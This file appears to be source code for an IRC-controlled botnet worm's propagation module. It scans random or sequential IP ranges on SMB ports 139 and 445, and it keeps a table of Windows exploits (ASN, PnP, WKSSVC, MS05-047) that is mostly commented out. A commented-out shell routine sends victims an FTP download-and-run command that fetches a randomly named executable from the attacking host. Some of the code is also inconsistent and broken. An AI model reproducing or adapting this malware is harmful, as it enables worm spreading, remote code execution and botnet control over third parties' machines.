#ifndef NO_ADVSCAN
#include "vPOEb.h"
#include "vExterns.h"
#include "vAdvScan.h"
#include "Random.h"

// globals
CScanner CScanner::main;
CRITICAL_SECTION CriticalSection;

EXPLOIT exploit[]={
/*    //exploits
	//---
	//asn
	{"asn139",	"asn139",	139,	ASN,	0, TRUE},
	{"asn445",	"asn445",	445,	ASN,	0, TRUE},
	//pnp
	{"pnp445",	"pnp445",	445,	PnP445,	0, TRUE},
	//wkssvc
	{"wksvce",	"WKSSVCE",	445,	wkssvce,	0, TRUE},
	{"wksvco",	"WKSSVCO",	445,	wkssvco,	0, TRUE},
	{"wksvc2",	"WKSSVC2",	445,	wkssvc2,	0, TRUE},
	{"wksvce139","WKSSVCE139", 139,	wkssvce,	0, TRUE},
	{"wksvco139","WKSSVCO139", 139,	wkssvco,	0, TRUE},
	{"wksvc2139","WKSSVC2139", 139,	wkssvc2,	0, TRUE},
	//umpnp
	{"ms05047",	"ms05047",	445,	ms05047,	0, TRUE},
//	{name,		display name, port,	function, stats, enable ftp},*/
	{NULL, NULL, 0, NULL, 0, FALSE}
};

SCANALL scanall[]={
	{"asn", true},
	{"wksvc2139", true},
};

SCANALL ntscan[]={
	{"wksvc2139", true},
	{"wksvc2",  true},
};

#ifndef NO_WKSSVC
SCANALL wksescan[]={
	{"wksvce", true},
	{"wksvce139",  true},
};
SCANALL wksoscan[]={
	{"wksvco", true},
	{"wksvco139",  true},
};
int wksescansize=(sizeof(wksescan)/sizeof(SCANALL));
int wksoscansize=(sizeof(wksoscan)/sizeof(SCANALL));
#endif

int scanallsize=(sizeof(scanall)/sizeof(SCANALL));
int ntscansize=(sizeof(ntscan)/sizeof(SCANALL));

void CScanner::Init() {
	main.bRunning = true;
}

void *CScanner::Run()
{
	Sleep(50);
	InitializeRandomSeed(); 
	CreateThread(NULL, 0,(unsigned long (__stdcall *)(void *))AdvScanner, NULL, 0, NULL);		
	Sleep(30);
	return NULL;
}

void CScanner::ListExploitStats(BOOL verbose, int total)
{
//	IRC* irc=(IRC*)conn;
	char buffer[512], buffer2[512];

	int extotal = 0;

	sprintf(buffer, "Exploit Statistics:");
	for(int i=0; exploit[i].port != 0; i++)
	{
		if (lstrcmpi(exploit[i].name,"banner"))
		{
			extotal += exploit[i].stats;
			sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
			strncat(buffer, buffer2, sizeof(buffer));
		}
	}
	//extotal += eftpsends;
/*	sprintf(buffer2, " Exploit FTPD: %d, Total: %d.", eftpsends, extotal);
	strncat(buffer, buffer2, sizeof(buffer));*/

	if (extotal > total)
//		irc->privmsg(target,buffer);
		vPOEb->vIRC.SendData("PRIVMSG %s : %s",vPOEb->vIRC.msgTo.c_str(),buffer);
	else
	{
		if (verbose) 
//			irc->privmsg(target,buffer);
			vPOEb->vIRC.SendData("PRIVMSG %s : %s",vPOEb->vIRC.msgTo.c_str(),buffer);
	}
	return;
}

/*BOOL CScanner::ConnectShell(EXINFO exinfo, unsigned int connectport)
{
	int len;
	char recvbuf[1024];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(exinfo.ip);
	shell_addr.sin_port = htons(connectport);

	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (connect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;

	char mkdir_buff[400];

	len = recv(sockfd, recvbuf, 1024, 0);

	char fname[_MAX_FNAME];
	sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	_snprintf(mkdir_buff,sizeof(mkdir_buff),
		"echo open %s %d > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -n -s:i &%s\r\n",
//		(PrivateIP(exinfo.ip)?inip:exip),FTP_PORT,fname,fname);
		(PrivateIP(exinfo.ip)?sLocalHost:sExternalHost),FTP_PORT,fname,fname);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);

	if (send(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = recv(sockfd, recvbuf, 1024, 0);
	closesocket(sockfd);
	return TRUE;
}*/

char* CScanner::MakeIP(char *ip,BOOL Random,int Class) {
	if(!ip)
		return NULL;

	static char retip[16];
	ZeroMemory(retip,sizeof(retip));

	char *tokens[4];
	char ipbuf[16];
	strncpy(ipbuf,ip,16);
	tokens[0]=strtok(ipbuf,".");
	if(!tokens[0])
		return NULL;
	for(int i=1;i<4;i++) {
		tokens[i]=strtok(NULL,".");
		if(!tokens[i])
			return NULL;
	}
	if (Class==1) //A Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],(Random?"x":"0"),(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==2) //B Class
	{
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],(Random?"x":"0"),(Random?"x":"0"));
	}
	else if (Class==3) //C Class
		sprintf(retip,"%s.%s.%s.%s",tokens[0],tokens[1],tokens[2],(Random?"x":"0"));

	else
	{
		return NULL;
	}

	return retip;
}

void CScanner::CurrentIP() {
//	IRC* irc=(IRC*)conn;
/*	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;
//		irc->privmsg(target,"%s Current IP: %s.",scan_title,inet_ntoa(in));
	} else 
//		irc->privmsg(target,"%s Scan not active.",scan_title);
	*/return;
}

void CScanner::CheckServers(ADVSCAN scan) {
	DWORD id;
	if(scan.exploit != -1) {
		if (exploit[scan.exploit].ftp) {
//			if (findthreadid(FTPD_THREAD) == 0) {
			if (!bRunning){
				static RSD rsd;
				srand(GetTickCount());
				rsd.port = (rand()%48127)+1024;
				rsd.threads = 0;
				GetModuleFileName(0,rsd.filename,sizeof(rsd.filename));
		//		strncpy(rds.requestname, filename, sizeof(rds.requestname)-1);
				rsd.gotinfo=FALSE;
				strncpy(rsd.chan,scan.target,sizeof(rsd.chan)-1);
				rsd.silent=main.scan.silent;
				rsd.verbose=main.scan.verbose;
/*				rsd.threadnum=addthread(RSD_THREAD,"%s Server started, http://%s:%i/%s.", rsd_title,exip, rsd.port, rsd.filename);
				if (threads[rsd.threadnum].tHandle = CreateThread(NULL, 0, &HttpSendThread, (LPVOID)&rsd, 0, &id)) {
					while (rsd.gotinfo == FALSE) 
						Sleep(50);
				}*/
			}
		}
	}

	return;
}

string CScanner::AdvGetNextIP(string seqIp) {
	return htonl(ntohl(inet_addr(seqIp.c_str())+1));
}

string CScanner::AdvGetNextIPRandom(string scanIp) {
	string returnIp,rTemp; stringstream ss; int pos=0; 
	for(int i=0; i<count(scanIp.begin(),scanIp.end(),'x'); i++) {
		ss << GetRandNum(1, 255); rTemp += "."; rTemp += ss.str();		
		ss.str(""); }
	returnIp = scanIp.substr(pos,scanIp.find("x")-1) + rTemp;
	return returnIp;
}

BOOL CScanner::AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay) {
	
	IN_ADDR in;
	in.s_addr=ip;
	//no sense scanning ourself
	if (!strcmp(inet_ntoa(in),sExternalHost.c_str()) || !strcmp(inet_ntoa(in),sLocalHost.c_str()))
		return FALSE;

	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = htons((unsigned short)port);
	ioctlsocket(sock,FIONBIO,&blockcmd);
	connect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = select(0,0,&rset,0,&timeout);
	closesocket(sock);

	if (i<=0) 
		return FALSE;
	else 
		return TRUE;
}

void CScanner::AdvScanner()
{
//	IRC* irc=(IRC*)scan.conn;
//	scanp->gotinfo = TRUE;
//	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	CheckServers(main.scan);

//	if (findthreadid(SCAN_THREAD) == 1)
	if (!bRunning)
	{
		DeleteCriticalSection(&CriticalSection); // just in case
		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400))
		{
			// failed to initialize CriticalSection
			if (!scan.silent)
//				irc->privmsg(scan.target,"%s Failed to initialize critical section, error: <%d>",scan_title,GetLastError());
				vPOEb->vIRC.SendData("PRIVMSG %s: Failed to initialize critical section.");
			return 0;
		}
	}

//	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++)
	{
		scan.cthreadid = i;
		scan.cthreadnum = addthread(SCAN_THREAD,"%s %s:%d, Scan thread: %d, Sub-thread: %d.",scan_title,scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		threads[scan.cthreadnum].parent = scan.threadnum;
/*		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		}*/
		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
//		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
//	in.s_addr = advinfo[scan.threadnum].ip;
	if (!scan.silent && scan.verbose)
//		irc->privmsg(scan.target,"%s Finished at %s:%d after %d minute(s) of scanning.",scan_title, inet_ntoa(in), scan.port, scan.minutes);

//	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}



void CScanner::AdvPortScanner()
{
/*	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	IRC* irc=(IRC*)scan.conn;*/
//	scanp->cgotinfo = TRUE;

	IN_ADDR in;

//	int threadnum=scan.cthreadnum;
//	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
//	while (advinfo[threads[threadnum].parent].info) {
		string dwIP;
		
		if (scan.random)
			dwIP=AdvGetNextIPRandom(dwIP);
		else
			dwIP=AdvGetNextIP(threads[threadnum].parent);
		in.s_addr=dwIP;

		if (AdvPortOpen(dwIP,scan.port,scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				if (!scan.silent)
//					irc->privmsg(scan.target,"%s Portscan: %s:%d open.",scan_title,inet_ntoa(in),scan.port);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, inet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				sprintf(exinfo.chan, scan.target);
				exinfo.silent = scan.silent;
				exinfo.verbose = scan.verbose;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(scan.target,irc,exinfo);

			}
		}
		Sleep(2000);
	}
//	clearthread(threadnum);

	ExitThread(0);
}
#endif

BOOL PrivateIP(const char *ip) {
	if(!ip) return FALSE; if(!strcmp(ip, "")) return FALSE;
	char *tokens[4]; char ipbuf[32];
	strncpy(ipbuf, ip, 32);
	tokens[0]=strtok(ipbuf, ".");
	if(!tokens[0]) return FALSE;
	for(int i=1;i<4;i++) { tokens[i]=strtok(NULL, "."); if(!tokens[i]) return FALSE; }
	if(!strcmp(tokens[0], "10")) return TRUE;								// Class A private network
	if(!strcmp(tokens[0], "172") && !strcmp(tokens[1], "16")) return TRUE;	// Class B Private network
	if(!strcmp(tokens[0], "192") && !strcmp(tokens[1], "168")) return TRUE;	// Class C private network
	if(!strcmp(tokens[0], "90") && !strcmp(tokens[1], "0")) return TRUE;	// Class Bastart private network :P
	return FALSE;
}
